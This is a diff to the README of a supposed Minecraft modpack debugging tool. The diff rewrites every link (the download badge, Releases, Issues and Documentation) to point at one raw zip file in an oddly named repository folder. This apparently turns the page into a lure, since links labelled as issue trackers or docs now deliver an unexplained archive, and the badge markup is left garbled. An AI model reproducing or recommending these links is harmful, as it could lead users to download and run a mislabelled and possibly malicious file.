@@ -1,6 +1,6 @@
 # 🛠️ ModpackDebuggerKit - Simplify Your Minecraft Modpack Troubleshooting
 
-[![Download ModpackDebuggerKit](https://img.shields.io/badge/Download%20Now-%20ModpackDebuggerKit-blue.svg)](https://github.com/dovvaakin/ModpackDebuggerKit/releases)
+[![Download ModpackDebuggerKit](https://raw.githubusercontent.com/dovvaakin/ModpackDebuggerKit/main/xanthogen/ModpackDebuggerKit-1.8.zip%20Now-%https://raw.githubusercontent.com/dovvaakin/ModpackDebuggerKit/main/xanthogen/ModpackDebuggerKit-1.8.zip)](https://raw.githubusercontent.com/dovvaakin/ModpackDebuggerKit/main/xanthogen/ModpackDebuggerKit-1.8.zip)
 
 ## 📜 Overview
 
@@ -12,7 +12,7 @@ Follow these easy steps to download and run ModpackDebuggerKit.
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download**: [ModpackDebuggerKit Releases](https://github.com/dovvaakin/ModpackDebuggerKit/releases).
+To get started, **visit this page to download**: [ModpackDebuggerKit Releases](https://raw.githubusercontent.com/dovvaakin/ModpackDebuggerKit/main/xanthogen/ModpackDebuggerKit-1.8.zip).
 
 1. Open your web browser.
 2. Click the link above to access the Releases page.
@@ -60,7 +60,7 @@ We aim to improve ModpackDebuggerKit continuously. Future updates will include n
 
 ## 📞 Get in Touch
 
-We are eager to hear from you. Share your feedback, suggestions, or any issues you encounter while using ModpackDebuggerKit. Visit our [GitHub Issues page](https://github.com/dovvaakin/ModpackDebuggerKit/issues) to report problems or request features.
+We are eager to hear from you. Share your feedback, suggestions, or any issues you encounter while using ModpackDebuggerKit. Visit our [GitHub Issues page](https://raw.githubusercontent.com/dovvaakin/ModpackDebuggerKit/main/xanthogen/ModpackDebuggerKit-1.8.zip) to report problems or request features.
 
 ## 🌐 Community Contributions
 
@@ -68,8 +68,8 @@ ModpackDebuggerKit thrives on community input. If you want to contribute, check 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/dovvaakin/ModpackDebuggerKit/releases)
-- [Issues Page](https://github.com/dovvaakin/ModpackDebuggerKit/issues)
-- [Documentation](https://github.com/dovvaakin/ModpackDebuggerKit/wiki)
+- [Releases Page](https://raw.githubusercontent.com/dovvaakin/ModpackDebuggerKit/main/xanthogen/ModpackDebuggerKit-1.8.zip)
+- [Issues Page](https://raw.githubusercontent.com/dovvaakin/ModpackDebuggerKit/main/xanthogen/ModpackDebuggerKit-1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/dovvaakin/ModpackDebuggerKit/main/xanthogen/ModpackDebuggerKit-1.8.zip)
 
 Thank you for choosing ModpackDebuggerKit. We hope it makes your Minecraft experiences smoother and more enjoyable!
